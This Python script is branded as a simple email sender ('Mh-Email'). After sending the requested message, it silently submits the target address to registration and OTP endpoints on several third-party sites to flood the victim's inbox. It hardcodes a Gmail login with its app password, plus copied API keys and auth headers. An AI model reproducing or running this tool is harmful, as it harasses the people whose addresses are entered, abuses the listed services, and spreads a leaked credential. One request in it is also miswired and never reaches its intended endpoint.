import os
import requests
import json
import base64
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_email(subject, text, to_email, from_email, password):
    # Create the email message
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(text, 'plain'))

    try:
        # Set up the server
        server = smtplib.SMTP('smtp.gmail.com', 587)  # Use your SMTP server and port
        server.starttls()  # Upgrade to a secure connection
        server.login(from_email, password)  # Log in to your email account

        # Send the email
        server.send_message(msg)
        print("Email sent successfully!")

    except Exception as e:
        print(f"Failed to send email: {e}")

    finally:
        server.quit()  # Close the server connection

def main():
    from_email = 'anonymousmh777@gmail.com'
    password = 'tqse fusj iunf goap'
    os.system("clear")
    print("""
   _____    ___ ___           ___________              .__.__   
  /     \  /   |   \          \_   _____/ _____ _____  |__|  |  
 /  \ /  \/    ~    \  ______  |    __)_ /     )(__  \ |  |  |  
/    Y    \    Y    / /_____/  |        \  Y Y  \/ __ \|  |  |__
\____|__  /\___|_  /          /_______  /__|_|  (____  /__|____/
        \/       \/                   \/      \/MataHacker.id
    [-] Wellcome To Mh-Email
    [!] send messages to email with custom text
""")
    email = input("    [?] Input Email: ")
    subject = input("    [?] Subject (Title): ")
    text = input("    [?] Message: ")
    send_email(subject, text, email, from_email, password)

    # Additional APIs
    url = "https://app.thefepi.com/mobile/Account/Register"
    headers = {    "Host": "app.thefepi.com",    "Connection": "keep-alive",    "Content-Length": "131",    "X-AppKey": "eyJpdiI6Im9ySEUvR0owSjdVL2M1V3Y5emZzOUE9PSIsInZhbHVlIjoibGJ3Rk1qNWhTbGRtOFJqSmpVZU9xZz09IiwibWFjIjoiYTc1NjcwNjgyMDkzODNlOTg3NzY1NzI3MGVjMzlkNzk4M2FiMzU4NmFiMWI0Y2Q3NTEwNDRkZWEzNDFmYzMyMSJ9",    "Authorization": "Basic dGhlZmVwaTohQCNhcHBzMjAyMVRI",    "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",    "Content-Type": "application/json; charset=utf-8",    "Accept": "*/*",    "Origin": "https://m.thefepi.com",    "Sec-Fetch-Site": "same-site",    "Sec-Fetch-Mode": "cors",    "Sec-Fetch-Dest": "empty",    "Referer": "https://m.thefepi.com/",    "Accept-Encoding": "gzip, deflate, br",    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"    }
    data = {    "input_email_telp": email,    "svc_id": "101",    "deviceId": "a1eeb982-9f71-4b42-9d11-c6f91a5ea5e8",    "deviceModel": "WebAndroid"    }
    response = requests.post(url, headers=headers, json=data)
    urla = 'https://api.smartseller.co.id/api/otp/send'
    headersa = {    'Host': 'api.smartseller.co.id',    'Content-Length': '86',    'sec-ch-ua-platform': '"Android"',    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',    'Accept': 'application/json, text/plain, */*',    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',    'Content-Type': 'application/json',    'sec-ch-ua-mobile': '?1',    'Origin': 'https://app.smartseller.co.id',    'Sec-Fetch-Site': 'same-site',    'Sec-Fetch-Mode': 'cors',    'Sec-Fetch-Dest': 'empty',    'Referer': 'https://app.smartseller.co.id/',    'Accept-Encoding': 'gzip, deflate, br, zstd',    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6',    'Priority': 'u=1, i'}
    dataa = {    "phone_number": "+6288229683563",    "email": email,    "send_method": "email"}
    responsea = requests.post(url, headers=headers, json=data)
    # FEPI
    url1 = "https://app.thefepi.com/mobile/Account/Register"
    headers1 = {
        "Host": "app.thefepi.com",
        "Content-Type": "application/json",
        "Authorization": "Basic dGhlZmVwaTohQCNhcHBzMjAyMVRI"
    }
    data1 = {
        "input_email_telp": email,
        "svc_id": "101",
        "deviceId": "a1eeb982-9f71-4b42-9d11-c6f91a5ea5e8",
        "deviceModel": "WebAndroid"
    }
    response1 = requests.post(url1, headers=headers1, json=data1)

    # PayJustNow
    url2 = "https://api.payjustnow.com/api/v2/app/register"
    headers2 = {
        "Host": "api.payjustnow.com",
        "Content-Type": "application/json"
    }
    data2 = {
        "email": email,
        "password": "Jsnskspd0d0d87wuw",
        "order_id": None
    }
    response2 = requests.post(url2, headers=headers2, json=data2)

    # Medical Node
    url3 = "https://www.medicalnode.ai/backend/api/Authentication/register-with-email"
    headers3 = {
        "Host": "www.medicalnode.ai",
        "Content-Type": "application/json"
    }
    data3 = {
        "emailAddress": email,
        "password": "Gshshe002028",
        "confirmPassword": "Gshshe002028",
        "isAgreed": True,
        "timeZone": "Asia/Jakarta"
    }
    response3 = requests.post(url3, headers=headers3, json=data3)

    # MirrorTalk
    url4 = "https://mirrortalk.ai/graphql/"
    headers4 = {
        "Host": "mirrortalk.ai",
        "Content-Type": "application/json"
    }
    coks = requests.get("https://mirrortalk.ai/register", headers=headers4).cookies.get_dict()
    cookies = {
        "s_Id": coks['s_Id'],
        "AWSALB": coks['AWSALB'],
        "AWSALBCORS": coks['AWSALBCORS']
    }
    data4 = {
        "operationName": "signUpUser",
        "variables": {
            "email": email,
            "plainPassword": "Gshshe002028",
            "fullName": "Gshshe002028",
            "professionId": 5,
            "employmentType": "EDUCATOR",
            "apiKey": "a3CJcDJmS9",
            "timezoneName": "Asia/Jakarta",
            "timezoneOffset": 25200
        },
        "query": (
            "mutation signUpUser($fullName: String, $email: String!, $plainPassword: String!, "
            "$employmentType: EmploymentType, $apiKey: String!, $referralCode: String, "
            "$sharedCode: String, $timezoneName: String, $timezoneOffset: Int, $professionId: ID) {"
            "  signUpUser("
            "    input: {fullName: $fullName, email: $email, plainPassword: $plainPassword, "
            "    employmentType: $employmentType, apiKey: $apiKey, referralCode: $referralCode, "
            "    sharedCode: $sharedCode, timezone: {timezoneName: $timezoneName, "
            "    timezoneOffset: $timezoneOffset}, professionId: $professionId}"
            "  ) {"
            "    userId"
            "    confirmationRequestExpiredTimestamp"
            "    __typename"
            "  }"
            "}"
        )
    }
    response4 = requests.post(url4, headers=headers4, cookies=cookies, data=json.dumps(data4))

    # Brain Predis AI
    url5 = "https://brain.predis.ai/users/authorize_login/"
    headers5 = {
        "Host": "brain.predis.ai",
        "Authorization": "Basic " + base64.b64encode(f"{email}:Gshshe002028".encode()).decode(),
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
    }
    data5 = {
        "mode": "create",
        "url_params": "",
        "referral": "null",
        "user_referral_code": "null",
        "session_id": "null",
        "referral_url": "null",
        "device": "Android",
        "app_id": "function () { [native code] }",
        "referral_session_history": "null",
        "is_mobile": "false"
    }
    response5 = requests.post(url5, headers=headers5, data=data5)

    # Display the responses
    print(f"   [•] Status: Success")

if __name__ == "__main__":
    main()
